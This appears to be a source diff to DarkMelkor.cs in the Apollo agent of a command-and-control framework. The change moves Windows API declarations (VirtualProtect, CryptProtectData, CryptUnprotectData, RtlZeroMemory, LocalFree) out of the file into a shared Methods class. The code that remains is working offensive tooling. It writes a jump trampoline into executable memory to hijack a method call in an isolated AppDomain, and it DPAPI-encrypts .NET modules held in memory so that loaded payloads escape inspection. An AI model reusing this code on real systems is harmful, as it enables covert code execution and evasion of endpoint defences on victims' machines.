+++ Payload_Type/apollo/agent_code/Apollo/Utils/DarkMelkor.cs
@@ -3,94 +3,13 @@ using System.IO;
 using System.Reflection;
 using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
+using Native;
 
 namespace Apollo.Utils
 {
     class DarkMelkor
     {
-        [DllImport("kernel32")]
-        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
-        // API
-        //======================
-        [DllImport("ntdll.dll")]
-        public static extern UInt32 NtFreeVirtualMemory(
-            IntPtr ProcessHandle,
-            ref IntPtr BaseAddress,
-            ref IntPtr RegionSize,
-            AllocationType FreeType);
-
-        [DllImport("ntdll.dll")]
-        public static extern void RtlZeroMemory(
-            IntPtr Destination,
-            int length);
-
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr LocalFree(
-            IntPtr hMem);
-
-        [DllImport("crypt32.dll", CharSet = CharSet.Auto)]
-        public static extern bool CryptProtectData(
-            ref DATA_BLOB pPlainText,
-            string szDescription,
-            ref DATA_BLOB pEntropy,
-            IntPtr pReserved,
-            IntPtr pPrompt,
-            int dwFlags,
-            ref DATA_BLOB pCipherText);
-
-        [DllImport("crypt32.dll", CharSet = CharSet.Auto)]
-        public static extern bool CryptUnprotectData(
-            ref DATA_BLOB pCipherText,
-            ref string pszDescription,
-            ref DATA_BLOB pEntropy,
-            IntPtr pReserved,
-            IntPtr pPrompt,
-            int dwFlags,
-            ref DATA_BLOB pPlainText);
-
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        internal struct DATA_BLOB
-        {
-            public int cbData;
-            public IntPtr pbData;
-        }
-
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        internal struct CRYPTPROTECT_PROMPTSTRUCT
-        {
-            public int cbSize;
-            public int dwPromptFlags;
-            public IntPtr hwndApp;
-            public string szPrompt;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        internal struct DPAPI_MODULE
-        {
-            public String sModName;
-            public int iModVersion;
-            public int iModSize;
-            public IntPtr pMod;
-            public Byte[] bMod;
-        }
-
-        [Flags]
-        public enum AllocationType : uint
-        {
-            Commit = 0x1000,
-            Reserve = 0x2000,
-            Decommit = 0x4000,
-            Release = 0x8000,
-            Reset = 0x80000,
-            Physical = 0x400000,
-            TopDown = 0x100000,
-            WriteWatch = 0x200000,
-            ResetUndo = 0x1000000,
-            LargePages = 0x20000000
-        }
-
-        // Globals
         //======================
         public static Byte[] bEntropy = { 0x90, 0x91, 0x92, 0x93 }; // Add entropy to the crypto
         public static int CRYPTPROTECT_LOCAL_MACHINE = 0x4;
@@ -125,13 +44,13 @@ namespace Apollo.Utils
             patch[2] = 12;
 
             uint oldprotect = 0;
-            VirtualProtect(codeSleeve, new UIntPtr((uint)patch[2]), 0x4, out oldprotect);
+            Methods.VirtualProtect(codeSleeve, new UIntPtr((uint)patch[2]), 0x4, out oldprotect);
             Marshal.WriteByte(codeSleeve, 0x48);
             Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
             Marshal.WriteIntPtr(IntPtr.Add(codeSleeve, 2), codeAce);
             Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[0]), 0xff);
             Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);
-            VirtualProtect(codeSleeve, new UIntPtr((uint)patch[2]), oldprotect, out oldprotect);
+            Methods.VirtualProtect(codeSleeve, new UIntPtr((uint)patch[2]), oldprotect, out oldprotect);
             try
             {
                 isolationDomain.DoCallBack(Sleeve);
@@ -185,7 +104,7 @@ namespace Apollo.Utils
 
             oBlob.pbData = Marshal.AllocHGlobal(bData.Length);
             oBlob.cbData = bData.Length;
-            RtlZeroMemory(oBlob.pbData, bData.Length);
+            Methods.RtlZeroMemory(oBlob.pbData, bData.Length);
             Marshal.Copy(bData, 0, oBlob.pbData, bData.Length);
 
             return oBlob;
@@ -195,7 +114,7 @@ namespace Apollo.Utils
         {
             //IntPtr piLen = (IntPtr)oMod.iModSize;
             //NtFreeVirtualMemory((IntPtr)(-1), ref oMod.pMod, ref piLen, AllocationType.Release);
-            LocalFree(oMod.pMod);
+            Methods.LocalFree(oMod.pMod);
         }
 
         public static DPAPI_MODULE dpapiEncryptModule(Byte[] bMod, String sModName, Int32 iModVersion = 0)
@@ -206,7 +125,7 @@ namespace Apollo.Utils
             DATA_BLOB oCipherText = new DATA_BLOB();
             DATA_BLOB oEntropy = makeBlob(bEntropy);
 
-            Boolean bStatus = CryptProtectData(ref oPlainText, sModName, ref oEntropy, IntPtr.Zero, IntPtr.Zero, CRYPTPROTECT_LOCAL_MACHINE, ref oCipherText);
+            Boolean bStatus = Methods.CryptProtectData(ref oPlainText, sModName, ref oEntropy, IntPtr.Zero, IntPtr.Zero, CRYPTPROTECT_LOCAL_MACHINE, ref oCipherText);
             if (bStatus)
             {
                 dpMod.sModName = sModName;
@@ -230,7 +149,7 @@ namespace Apollo.Utils
             DATA_BLOB oEntropy = makeBlob(bEntropy);
 
             String sDescription = String.Empty;
-            Boolean bStatus = CryptUnprotectData(ref oCipherText, ref sDescription, ref oEntropy, IntPtr.Zero, IntPtr.Zero, 0, ref oPlainText);
+            Boolean bStatus = Methods.CryptUnprotectData(ref oCipherText, ref sDescription, ref oEntropy, IntPtr.Zero, IntPtr.Zero, 0, ref oPlainText);
             if (bStatus)
             {
                 oMod.pMod = oPlainText.pbData;
